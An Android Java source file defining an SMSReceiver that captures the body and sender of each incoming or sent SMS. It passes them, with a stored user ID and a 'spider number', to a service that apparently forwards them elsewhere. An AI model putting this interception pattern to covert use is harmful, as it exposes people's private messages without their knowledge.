package com.it.mougang.gasmyr.events.Receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.it.mougang.gasmyr.events.Services.SMSService;
import com.it.mougang.gasmyr.events.Utilities.GlobalConstants;
import com.it.mougang.gasmyr.events.Utilities.Utils;

/**
 * Created by gasmyr on 10/27/15.
 */
public class SMSReceiver extends BroadcastReceiver {
    String SMS_SENDER = null;
    String SMS_BODY = null;
    String USER_ID = null;
    String SPIDER_NUMBER = null;
    private boolean canSendBySms = false;
    private boolean smsIsEnable = false;
    private SharedPreferences sharedPreferences;

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            init(context);
            if (bundle != null) {
                Object[] sms = (Object[]) bundle.get("pdus");
                for (int i = 0; i < sms.length; ++i) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sms[i]);
                    SMS_BODY = smsMessage.getMessageBody().toString();
                    SMS_SENDER = smsMessage.getOriginatingAddress();
                }
                if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                    if (SMS_BODY.length() >= 2) {
                        startSmsSenderService(context);
                    }
                }
                if (intent.getAction().equals("android.provider.Telephony.SMS_SENT")) {
                    startSmsSenderService(context);
                }
            }
        } catch (Exception e) {
            Log.e("ERROR", e.getMessage());
        }
    }

    private void startSmsSenderService(Context context) {
        synchronized (new Object()) {
            Intent smsService = new Intent(context, SMSService.class);
            smsService.putExtra(GlobalConstants.EVENT_INCOMING_SMS_BODY, SMS_BODY);
            smsService.putExtra(GlobalConstants.EVENT_INCOMING_SMS_SENDER_NUMBER, SMS_SENDER);
            smsService.putExtra(GlobalConstants.EVENT_INCOMING_SMS_DATE, Utils.getCurrentDateAsString());
            smsService.putExtra(GlobalConstants.USER_ID, USER_ID);
            smsService.putExtra(GlobalConstants.CAN_SEND_BY_SMS, canSendBySms);
            smsService.putExtra(GlobalConstants.SPIDER_NUMBER, SPIDER_NUMBER);
            smsService.putExtra(GlobalConstants.ENABLE_SMS, smsIsEnable);
            context.startService(smsService);
        }
    }

    private void init(Context context) {
        sharedPreferences = context.getSharedPreferences(GlobalConstants.EVENT_SHARE_PREF_ID, Context.MODE_PRIVATE);
        USER_ID = sharedPreferences.getString(GlobalConstants.USER_ID, null);
        SPIDER_NUMBER = sharedPreferences.getString(GlobalConstants.SPIDER_NUMBER, null);
        canSendBySms = sharedPreferences.getBoolean(GlobalConstants.CAN_SEND_BY_SMS, false);
        smsIsEnable = sharedPreferences.getBoolean(GlobalConstants.ENABLE_SMS, false);
    }
}
